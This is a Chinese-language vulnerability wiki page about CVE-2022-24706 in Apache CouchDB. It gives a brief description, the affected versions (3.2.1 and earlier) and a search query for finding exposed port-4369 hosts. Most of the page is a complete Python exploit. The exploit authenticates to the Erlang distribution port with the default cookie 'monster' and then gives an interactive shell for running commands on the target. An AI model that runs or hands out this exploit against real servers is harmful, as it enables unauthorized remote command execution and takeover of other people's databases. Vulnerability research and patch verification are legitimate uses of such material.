<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20CouchDB%20epmd%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-24706/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache CouchDB epmd 远程命令执行漏洞 CVE-2022-24706 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache CouchDB epmd \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2022-24706", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u9a8c\u8bc1POC", url: "#poc" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache%20Druid%20LoadData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-36749/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache%20Druid%20LoadData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-36749/" class="btn btn-xs btn-link">
        Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-link">
        Apache Cocoon XML注入 CVE-2020-11991
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-couchdb-epmd-cve-2022-24706">Apache CouchDB epmd 远程命令执行漏洞 CVE-2022-24706<a class="headerlink" href="#apache-couchdb-epmd-cve-2022-24706" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Apache CouchDB 是一个开源的无缝多主同步数据库，使用直观的HTTP/JSON API，并为可靠性而设计。</p>
<p>4月26日，Apache发布安全公告，公开了Apache CouchDB中的一个远程代码执行漏洞（CVE-2022-24706）。在3.2.2 版本之前的 Apache CouchDB 中，可以在不进行身份验证的情况下访问不正确的默认安装并获得管理员权限</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p><a-checkbox checked>CouchDB &lt;= 3.2.1</a-checkbox></br></p>
<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p><a-checkbox checked>port="4369" &amp;&amp; "couchdb"</a-checkbox></br></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>主页面， 默认端口为 5984</p>
<p><img alt="img" src="../../../.vuepress/public/img/1652581147618-09f861b4-509c-4eb9-847a-e65d5b8ec944.png" /></p>
<p>使用POC验证</p>
<p><img alt="img" src="../../../.vuepress/public/img/1652583160527-385ac7eb-1cbf-47d6-be07-ddbbd4d9fdb7.png" /></p>
<h2 id="poc">验证POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="n">CouchDB</span><span class="w"> </span><span class="mf">3.2.1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="nf">Execution</span><span class="w"> </span><span class="p">(</span><span class="n">RCE</span><span class="p">)</span>
<span class="err">#</span><span class="w"> </span><span class="n">Date</span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mi">21</span>
<span class="err">#</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="n">Author</span><span class="p">:</span><span class="w"> </span><span class="n">Konstantin</span><span class="w"> </span><span class="n">Burov</span><span class="p">,</span><span class="w"> </span><span class="nd">@_sadshade</span>
<span class="err">#</span><span class="w"> </span><span class="n">Software</span><span class="w"> </span><span class="n">Link</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//couchdb.apache.org/</span>
<span class="err">#</span><span class="w"> </span><span class="n">Version</span><span class="p">:</span><span class="w"> </span><span class="mf">3.2.1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">below</span>
<span class="err">#</span><span class="w"> </span><span class="n">Tested</span><span class="w"> </span><span class="n">on</span><span class="p">:</span><span class="w"> </span><span class="n">Kali</span><span class="w"> </span><span class="mf">2021.2</span>
<span class="err">#</span><span class="w"> </span><span class="n">Based</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mf">1F</span><span class="mi">98</span><span class="n">D</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">Erlang</span><span class="w"> </span><span class="n">Cookie</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">Execution</span>
<span class="err">#</span><span class="w"> </span><span class="n">Shodan</span><span class="p">:</span><span class="w"> </span><span class="n">port</span><span class="p">:</span><span class="mi">4369</span><span class="w"> </span><span class="s">&quot;name couchdb at&quot;</span>
<span class="err">#</span><span class="w"> </span><span class="n">CVE</span><span class="p">:</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mi">24706</span>
<span class="err">#</span><span class="w"> </span><span class="n">References</span><span class="p">:</span>
<span class="err">#</span><span class="w">  </span><span class="n">https</span><span class="p">:</span><span class="c1">//habr.com/ru/post/661195/</span>
<span class="err">#</span><span class="w">  </span><span class="n">https</span><span class="p">:</span><span class="c1">//www.exploit-db.com/exploits/49418</span>
<span class="err">#</span><span class="w">  </span><span class="n">https</span><span class="p">:</span><span class="c1">//insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/</span>
<span class="err">#</span><span class="w">  </span><span class="n">https</span><span class="p">:</span><span class="c1">//book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce</span>
<span class="err">#</span><span class="w"> </span>
<span class="err">#</span>
<span class="err">#</span><span class="o">!/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python3</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="n">from</span><span class="w"> </span><span class="n">hashlib</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">md5</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="n">TARGET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>
<span class="n">EPMD_PORT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4369</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">Erlang</span><span class="w"> </span><span class="n">distributed</span><span class="w"> </span><span class="n">port</span>
<span class="n">COOKIE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;monster&quot;</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">Erlang</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">CouchDB</span><span class="w"> </span>
<span class="n">ERLNAG_PORT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span>
<span class="n">EPM_NAME_CMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="s">&quot;\x00\x01\x6e&quot;</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">Request</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">nodes</span><span class="w"> </span><span class="n">list</span>

<span class="err">#</span><span class="w"> </span><span class="n">Some</span><span class="w"> </span><span class="n">data</span><span class="p">:</span>
<span class="n">NAME_MSG</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="s">&quot;\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA&quot;</span>
<span class="n">CHALLENGE_REPLY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="s">&quot;\x00\x15r\x01\x02\x03\x04&quot;</span>
<span class="n">CTRL_DATA</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="s">&quot;\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03&quot;</span>
<span class="n">CTRL_DATA</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="s">&quot;\x00\x00\x00\x00\x00w\x00w\x03rex&quot;</span>


<span class="n">def</span><span class="w"> </span><span class="nf">compile_cmd</span><span class="p">(</span><span class="n">CMD</span><span class="p">):</span>
<span class="w">    </span><span class="n">MSG</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="s">&quot;\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00&quot;</span>
<span class="w">    </span><span class="n">MSG</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="s">&quot;\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k&quot;</span>
<span class="w">    </span><span class="n">MSG</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">struct</span><span class="p">.</span><span class="na">pack</span><span class="p">(</span><span class="s">&quot;&gt;H&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="n">CMD</span><span class="p">))</span>
<span class="w">    </span><span class="n">MSG</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">(</span><span class="n">CMD</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">ascii</span><span class="err">&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="n">MSG</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="err">&#39;</span><span class="n">jw</span><span class="err">\</span><span class="n">x04user</span><span class="err">&#39;</span>
<span class="w">    </span><span class="n">PAYLOAD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="err">&#39;\</span><span class="n">x70</span><span class="err">&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">CTRL_DATA</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">MSG</span>
<span class="w">    </span><span class="n">PAYLOAD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">struct</span><span class="p">.</span><span class="na">pack</span><span class="p">(</span><span class="err">&#39;</span><span class="o">!</span><span class="n">I</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">PAYLOAD</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">PAYLOAD</span>

<span class="nf">print</span><span class="p">(</span><span class="s">&quot;Remote Command Execution via Erlang Distribution Protocol.\n&quot;</span><span class="p">)</span>

<span class="k">while</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">TARGET</span><span class="p">:</span>
<span class="w">    </span><span class="n">TARGET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s">&quot;Enter target host:\n&gt; &quot;</span><span class="p">)</span>

<span class="err">#</span><span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">EPMD</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="w">    </span><span class="n">epm_socket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="na">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">SOCK_STREAM</span><span class="p">)</span>
<span class="w">    </span><span class="n">epm_socket</span><span class="p">.</span><span class="na">connect</span><span class="p">((</span><span class="n">TARGET</span><span class="p">,</span><span class="w"> </span><span class="n">EPMD_PORT</span><span class="p">))</span>
<span class="n">except</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">error</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">msg</span><span class="p">:</span>
<span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Couldnt connect to EPMD: %s\n terminating program&quot;</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">msg</span><span class="p">)</span>
<span class="w">    </span><span class="n">sys</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">epm_socket</span><span class="p">.</span><span class="na">send</span><span class="p">(</span><span class="n">EPM_NAME_CMD</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="n">request</span><span class="w"> </span><span class="n">Erlang</span><span class="w"> </span><span class="n">nodes</span>
<span class="k">if</span><span class="w"> </span><span class="n">epm_socket</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">b</span><span class="err">&#39;\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x11</span><span class="err">\</span><span class="n">x11</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">OK</span>
<span class="w">    </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">epm_socket</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="w">    </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="o">[</span><span class="mi">0</span><span class="p">:</span><span class="n">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="o">]</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="err">&#39;</span><span class="n">ascii</span><span class="err">&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&quot;\n&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
<span class="w">        </span><span class="n">choise</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
<span class="w">        </span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Found &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">data</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span>
<span class="w">        </span><span class="n">print</span><span class="p">(</span><span class="s">&quot;\nMore than one node found, choose which one to use:&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="n">line_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">data</span><span class="p">:</span>
<span class="w">            </span><span class="n">line_number</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span>
<span class="w">            </span><span class="n">print</span><span class="p">(</span><span class="s">&quot; %d) %s&quot;</span><span class="w"> </span><span class="o">%</span><span class="p">(</span><span class="n">line_number</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="p">))</span>
<span class="w">        </span><span class="n">choise</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="n">input</span><span class="p">(</span><span class="s">&quot;\n&gt; &quot;</span><span class="p">))</span>

<span class="w">    </span><span class="n">ERLNAG_PORT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="na">search</span><span class="p">(</span><span class="s">&quot;\d+$&quot;</span><span class="p">,</span><span class="n">data</span><span class="o">[</span><span class="n">choise</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="o">]</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
<span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Node list request error, exiting&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="n">sys</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">epm_socket</span><span class="p">.</span><span class="na">close</span><span class="p">()</span>

<span class="err">#</span><span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Erlang</span><span class="w"> </span><span class="n">port</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="w">    </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="na">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">SOCK_STREAM</span><span class="p">)</span>
<span class="w">    </span><span class="n">s</span><span class="p">.</span><span class="na">connect</span><span class="p">((</span><span class="n">TARGET</span><span class="p">,</span><span class="w"> </span><span class="n">ERLNAG_PORT</span><span class="p">))</span>
<span class="n">except</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">error</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">msg</span><span class="p">:</span>
<span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Couldnt connect to Erlang server: %s\n terminating program&quot;</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">msg</span><span class="p">)</span>
<span class="w">    </span><span class="n">sys</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="na">send</span><span class="p">(</span><span class="n">NAME_MSG</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w">                    </span><span class="err">#</span><span class="w"> </span><span class="n">Receive</span><span class="w"> </span><span class="s">&quot;ok&quot;</span><span class="w"> </span><span class="n">message</span>
<span class="n">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="w">     </span><span class="err">#</span><span class="w"> </span><span class="n">Receive</span><span class="w"> </span><span class="s">&quot;challenge&quot;</span><span class="w"> </span><span class="n">message</span>
<span class="n">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">struct</span><span class="p">.</span><span class="na">unpack</span><span class="p">(</span><span class="s">&quot;&gt;I&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">challenge</span><span class="o">[</span><span class="mi">9</span><span class="p">:</span><span class="mi">13</span><span class="o">]</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>

<span class="err">#</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Extracted challenge: {}&quot;</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">challenge</span><span class="p">))</span>

<span class="err">#</span><span class="w"> </span><span class="n">Add</span><span class="w"> </span><span class="n">Challenge</span><span class="w"> </span><span class="n">Digest</span>
<span class="n">CHALLENGE_REPLY</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">md5</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">COOKIE</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ascii&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="o">+</span><span class="w"> </span><span class="n">bytes</span><span class="p">(</span><span class="n">str</span><span class="p">(</span><span class="n">challenge</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;ascii&quot;</span><span class="p">)).</span><span class="na">digest</span><span class="p">()</span>
<span class="n">s</span><span class="p">.</span><span class="na">send</span><span class="p">(</span><span class="n">CHALLENGE_REPLY</span><span class="p">)</span>
<span class="n">CHALLENGE_RESPONSE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="k">if</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="n">CHALLENGE_RESPONSE</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span>
<span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Authentication failed, exiting&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="n">sys</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">print</span><span class="p">(</span><span class="s">&quot;Authentication successful&quot;</span><span class="p">)</span>
<span class="n">print</span><span class="p">(</span><span class="s">&quot;Enter command:\n&quot;</span><span class="p">)</span>

<span class="n">data_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span>
<span class="k">while</span><span class="w"> </span><span class="n">True</span><span class="p">:</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">data_size</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span>
<span class="w">        </span><span class="n">CMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">CMD</span><span class="p">:</span>
<span class="w">            </span><span class="k">continue</span>
<span class="w">        </span><span class="n">elif</span><span class="w"> </span><span class="n">CMD</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;exit&quot;</span><span class="p">:</span>
<span class="w">            </span><span class="n">sys</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="w">        </span><span class="n">s</span><span class="p">.</span><span class="na">send</span><span class="p">(</span><span class="n">compile_cmd</span><span class="p">(</span><span class="n">CMD</span><span class="p">))</span>
<span class="w">        </span><span class="n">data_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">struct</span><span class="p">.</span><span class="na">unpack</span><span class="p">(</span><span class="s">&quot;&gt;I&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">Get</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">size</span>
<span class="w">        </span><span class="n">s</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span><span class="w">              </span><span class="err">#</span><span class="w"> </span><span class="n">Control</span><span class="w"> </span><span class="n">message</span>
<span class="w">        </span><span class="n">data_size</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mi">45</span><span class="w">         </span><span class="err">#</span><span class="w"> </span><span class="n">Data</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="n">without</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="n">message</span>
<span class="w">        </span><span class="n">time</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="w">    </span><span class="n">elif</span><span class="w"> </span><span class="n">data_size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">1024</span><span class="p">:</span><span class="w">        </span>
<span class="w">        </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="n">data_size</span><span class="p">)</span>
<span class="w">        </span><span class="err">#</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;S---data_size: %d, data_recv_size: %d&quot;</span><span class="w"> </span><span class="o">%</span><span class="p">(</span><span class="n">data_size</span><span class="p">,</span><span class="n">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
<span class="w">        </span><span class="n">time</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="w">        </span><span class="n">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">decode</span><span class="p">())</span>
<span class="w">        </span><span class="n">data_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span><span class="w">        </span>
<span class="w">        </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="w">        </span><span class="err">#</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;L---data_size: %d, data_recv_size: %d&quot;</span><span class="w"> </span><span class="o">%</span><span class="p">(</span><span class="n">data_size</span><span class="p">,</span><span class="n">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
<span class="w">        </span><span class="n">time</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="w">        </span><span class="n">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">decode</span><span class="p">(),</span><span class="n">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">data_size</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mi">1024</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache%20Druid%20LoadData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-36749/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache%20Druid%20LoadData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-36749/" class="btn btn-xs btn-link">
        Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
